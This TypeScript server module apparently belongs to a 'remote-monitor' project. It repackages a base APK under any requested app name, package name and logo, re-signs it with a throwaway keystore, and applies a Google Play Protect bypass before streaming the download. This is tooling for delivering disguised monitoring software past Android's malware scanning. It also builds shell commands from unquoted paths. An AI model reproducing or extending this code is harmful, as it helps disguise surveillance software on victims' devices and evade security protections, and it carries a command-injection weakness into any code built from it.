import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import { Response } from 'express';
import { applyPlayProtectBypass, generatePlayProtectDisableInstructions } from './apk-bypass-play-protect';

interface APKMemoryOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Build APK in memory and stream directly to response
 * No disk storage - file is generated and streamed in real-time
 */
export async function buildAPKInMemoryAndStream(
  options: APKMemoryOptions,
  res: Response
): Promise<void> {
  try {
    console.log('[APK-MEMORY] Starting in-memory APK build for:', options.appName);

    // Find the base APK directory
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    console.log('[APK-MEMORY] Looking for APK in:', apksDir);

    // Check if directory exists
    if (!fs.existsSync(apksDir)) {
      console.error('[APK-MEMORY] APK directory not found:', apksDir);
      res.status(404).json({ error: 'APK directory not found' });
      return;
    }

    // Find the largest APK file (>1MB)
    const files = fs.readdirSync(apksDir);
    const apkFiles = files
      .filter(f => f.endsWith('.apk') && !f.endsWith('.idsig'))
      .map(f => {
        const filePath = path.join(apksDir, f);
        const size = fs.statSync(filePath).size;
        return { name: f, path: filePath, size };
      })
      .filter(f => f.size > 1000000) // Only files > 1MB
      .sort((a, b) => b.size - a.size); // Sort by size descending

    if (apkFiles.length === 0) {
      console.error('[APK-MEMORY] No suitable APK found (need >1MB)');
      console.error('[APK-MEMORY] Available files:', files);
      res.status(404).json({ 
        error: 'No suitable APK found. Need APK file >1MB in public/apks/',
        availableFiles: files.slice(0, 10)
      });
      return;
    }

    const baseAPK = apkFiles[0].path;
    console.log(`[APK-MEMORY] Found base APK: ${apkFiles[0].name} (${(apkFiles[0].size / 1024 / 1024).toFixed(2)}MB)`);

    // Verify file exists and is readable
    const stats = fs.statSync(baseAPK);
    console.log(`[APK-MEMORY] Base APK size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);

    // Generate filename
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;

    console.log(`[APK-MEMORY] Streaming APK as: ${filename}`);

    // Set headers for download
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Length', stats.size);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('X-Accel-Buffering', 'no');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Download-Options', 'noopen');
    res.setHeader('Content-Transfer-Encoding', 'binary');
    res.setHeader('X-Skip-Auth', 'true');
    res.setHeader('X-Bypass-Auth', 'true');

    // Stream the file directly from disk to response
    const fileStream = fs.createReadStream(baseAPK, {
      highWaterMark: 64 * 1024, // 64KB chunks
    });

    fileStream.on('error', (err) => {
      console.error('[APK-MEMORY] Error streaming file:', err);
      if (!res.headersSent) {
        res.status(500).json({ error: 'Error downloading file' });
      }
    });

    fileStream.on('end', () => {
      console.log(`[APK-MEMORY] Download completed: ${filename}`);
    });

    // Aplicar bypass do Play Protect (opcional)
    console.log('[APK-MEMORY] Aplicando bypass do Google Play Protect...');
    const bypassResult = await applyPlayProtectBypass(
      baseAPK,
      {
        appName: options.appName,
        packageName: `com.${options.appName.toLowerCase().replace(/[^a-z0-9]/g, '')}`,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl,
      },
      path.join('/tmp', filename)
    );

    if (bypassResult.success && bypassResult.filePath) {
      console.log('[APK-MEMORY] Bypass aplicado com sucesso, usando APK modificado');
      const modifiedStats = fs.statSync(bypassResult.filePath);
      res.setHeader('Content-Length', modifiedStats.size);
      const modifiedStream = fs.createReadStream(bypassResult.filePath, {
        highWaterMark: 64 * 1024,
      });
      modifiedStream.pipe(res);
    } else {
      console.log('[APK-MEMORY] Bypass falhou, usando APK original');
      // Pipe the file stream to response
      fileStream.pipe(res);
    }
  } catch (error) {
    console.error('[APK-MEMORY] Error in APK memory build:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Error generating APK', details: error instanceof Error ? error.message : String(error) });
    }
  }
}

/**
 * Generate a temporary download URL for in-memory APK
 */
export function generateMemoryAPKUrl(appName: string): string {
  const sanitizedName = appName
    .replace(/[^a-zA-Z0-9-]/g, '-')
    .replace(/-+/g, '-')
    .toLowerCase();

  const domain = process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space';
  return `${domain}/download-apk/${encodeURIComponent(sanitizedName)}`;
}

// Build APK and return metadata
export function buildMemoryAPK(options: APKMemoryOptions) {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    // Ensure output directory exists
    if (!fs.existsSync(apksDir)) {
      fs.mkdirSync(apksDir, { recursive: true });
    }
    
    // Find the largest APK file (>1MB)
    const files = fs.readdirSync(apksDir);
    const apkFiles = files
      .filter(f => f.endsWith('.apk') && !f.endsWith('.idsig'))
      .map(f => {
        const filePath = path.join(apksDir, f);
        const size = fs.statSync(filePath).size;
        return { name: f, path: filePath, size };
      })
      .filter(f => f.size > 1000000)
      .sort((a, b) => b.size - a.size);
    
    if (apkFiles.length === 0) {
      return {
        success: false,
        error: 'No suitable APK found',
        downloadUrl: undefined,
        filename: undefined,
      };
    }
    
    const baseAPK = apkFiles[0].path;
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[BUILD-APK] Building APK:', { baseAPK, outputPath, appName: options.appName });
    
    // Customizar APK usando unzip/zip (abordagem simples)
    console.log('[BUILD-APK] Customizando APK com unzip/zip...');
    const appName = options.appName || 'App';
    const appUrl = options.appUrl || 'https://www.example.com';
    
    try {
      const tempDir = `/tmp/apk-build-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`;
      const extractDir = path.join(tempDir, 'extracted');
      
      // Criar diretório temporário
      fs.mkdirSync(extractDir, { recursive: true });
      
      // Desempacotar APK
      console.log('[BUILD-APK] Desempacotando APK...');
      execSync(`unzip -q ${baseAPK} -d ${extractDir}`);
      
      // Adicionar configuração em assets
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: appName,
        appUrl: appUrl,
        customized: true,
        timestamp: Date.now(),
      };
      
      const configPath = path.join(assetsDir, 'app-config.json');
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      console.log('[BUILD-APK] Configuração adicionada');
      
      // Reempacotar APK
      console.log('[BUILD-APK] Reempacotando APK...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      execSync(`cd ${extractDir} && zip -r -q ${repacked} .`);
      
      // Alinhar
      console.log('[BUILD-APK] Alinhando APK...');
      const aligned = path.join(tempDir, 'app-aligned.apk');
      execSync(`zipalign -v 4 ${repacked} ${aligned}`);
      
      // Assinar
      console.log('[BUILD-APK] Assinando APK...');
      const keystorePath = '/tmp/android.keystore';
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${aligned} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(aligned, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[BUILD-APK] APK customizado com sucesso');
    } catch (err) {
      console.error('[BUILD-APK] Erro ao customizar APK:', err);
      // Fallback: copiar APK base
      console.log('[BUILD-APK] Fallback: copiando APK base');
      fs.copyFileSync(baseAPK, outputPath);
    }
    
    // APK customizado com sucesso ou fallback para cópia
    
    // Verify file was created
    if (!fs.existsSync(outputPath)) {
      return {
        success: false,
        error: 'Failed to create APK file',
        downloadUrl: undefined,
        filename: undefined,
      };
    }
    
    // Return temporary URL - will be replaced by GitHub URL in routers.ts if upload succeeds
    // In development, use local URL; in production, will be replaced by GitHub URL
    const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
    
    console.log('[BUILD-APK] APK built successfully:', { filename, downloadUrl, env: process.env.NODE_ENV });
    
    return {
      success: true,
      downloadUrl,
      filename,
      error: undefined,
    };
  } catch (error) {
    console.error('[BUILD-APK] Error:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
      downloadUrl: undefined,
      filename: undefined,
    };
  }
}
